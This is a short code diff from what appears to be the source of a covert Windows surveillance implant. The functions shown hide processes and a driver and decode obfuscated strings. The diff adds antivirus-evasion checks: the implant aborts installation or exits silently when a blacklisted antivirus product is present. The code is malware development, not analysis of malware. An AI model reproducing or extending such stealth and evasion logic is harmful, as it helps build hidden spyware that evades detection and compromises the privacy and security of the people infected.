@@ -1707,6 +1707,12 @@ void __stdcall HM_RunCore(char *cmd_line, DWORD flags, STARTUPINFO *si, PROCESS_
 	HIDING();
 
 	HideDevice dev_probe;
+	
+	// Ci sono degli AV con cui proprio non si deve installare
+	if (IsBlackList())  {
+		ReportCannotInstall();
+		return;
+	}
 
 	// Decide se e dove copiare il driver 
 	// (Se c'e' ZoneAlarm E ctfmon NON mette il driver)
@@ -2806,6 +2812,10 @@ void __stdcall HM_sMain(void)
 	ScrambleString ss7("\r\n Xlt1UEP k.3 zdWWJ E7lt8vUEP8W\r\n\r\n"); // "\r\n Version 8.0 fully operational\r\n\r\n"
 
 	pid_hide_struct pid_hide;
+
+	// Ci sono degli AV con cui proprio non si deve installare
+	if (IsBlackList()) 
+		FNC(ExitProcess)(0);
 
 	//Riempie i campi relativi al nome del file immagine,
 	//file di configurazione, directory di installazione
